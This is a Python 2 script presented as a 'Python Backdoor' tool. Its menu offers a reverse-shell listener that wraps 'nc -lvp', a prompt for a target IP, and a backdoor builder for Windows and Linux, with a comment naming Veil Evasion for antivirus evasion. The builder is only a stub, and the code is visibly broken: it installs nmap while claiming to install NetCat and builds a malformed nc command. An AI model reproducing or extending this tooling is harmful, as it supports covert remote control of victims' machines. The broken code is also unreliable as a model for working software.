# Python Backdoor 0.1 Listener
# Made by Rusty50ul and Nips
# Ubuntu/Linux Version
# Imported modules
import os          #System Commands
import subprocess  #Multiple programs
import socket      #Sending TCP Information
import sys         #stderr, stdin, stdout capability
import time        #sleep,wait for certain processes to run or activate
#Variables
host = "0.0.0.0"   #Host IP
threads = 1        #Amount of Threads
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #Socket
data = "NaN"
process = "NaN"
process_data = "NaN"
incoming = '0.0.0.0' #Incoming Connection
port = "1234"
sock_ip_port=incoming,':',port
choice = "NaN"
#User input- reverse or bind shell? jump to class
#COLOR CLASS
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def opfail():
    print bcolors.WARNING + """Operation failed! Please refer to the logging for more information...""" + bcolors.ENDC
#main function
def menu():
    os.system("clear")
    global port #The port used
    global incoming #The Incoming IP used  
    global process
    global process_data
    global data
    global threads
    global host
    global choice
    print bcolors.OKBLUE + """
|==========================================================|
|==========================================================|
|----------------------------------------------------------|
|----____----_---_------_------__--__----------------------|
|---/ ___|--| | | |----/ \----|  \/  |--"security tool"----|
|---\___ \--| |_| |---/ _ \---| |\/| |---------------------|
|----___) |-|  _  |--/ ___ \--| |--| |---------------------|
|---|____/--|_| |_|-/_/---\_\-|_|--|_|(R)------------------|
|----------------------------------------------------------|
|==========================================================|
|==========================================================|
|Python Backdoor
|(1) [Reverse Shell Listener] 
|(2) [Running-Config]
|(3) [Build Backdoor/Distro]
|(4) [Help/Documentation]
|(5) [Quit]
""" + bcolors.ENDC

    usr = raw_input("""Enter an option: """)
    if usr == "1":
        print("Updating system...")
        os.system("sudo apt-get update && sudo apt-get upgrade")
        time.sleep(1)
        print("Installing NetCat...")
        os.system("sudo apt-get install nmap")
        time.sleep(1)
        print("Listening on %s" % port)
        os.system("nc -lvp"+ port)
        os.system("bg")
        time.wait
        menu()
    elif usr == "2":
        print("Run Config")
        incoming = raw_input("What is the IP addr of the target?: ")
        port = raw_input("What port do you want to listen on?: ")
        print('Your target is %s and you can listen on port %s.' % (incoming, port ))
        time.sleep(3)
        menu()
    elif usr == "3":
        print("Building backdoor...")
        time.sleep(1)
        os.system("clear")
        choice = raw_input("""
|==========================================|
|------------------------------------------|
|Back door Builder-(SHAM)-----___----------|
|Options:--------------------/|--|-------|
|(1) [Windows]---------------\____\--------|
|(2) [Linux]------------------___)-|-------|
|(3) [Main Menu]-------------|____/--------|
|------------------------------------------|
|==========================================|
|Enter an option: """)
        if choice == "1":
            print("You have selected Windows")
            time.sleep(1)
            menu()
        elif choice == "2":
            print("You have selected Linux")
            time.sleep(1)
            menu()
        elif choice == "3":
            print("You are returning back to the main menu")
            time.sleep(1)
            menu()
        else:
            opfail()
            time.sleep(2)
            menu()
    elif usr == "4":
        print("Help and Documentation")
        time.sleep(3)
        menu()
    elif usr == "5":
        print("Exiting...")
        time.sleep(1)
    else:
        opfail()
        time.sleep(2)
        menu()
    pass
#BACKDOOR BUILDER
#Using veil evasion
    
  
menu()   #Run the Menu Code
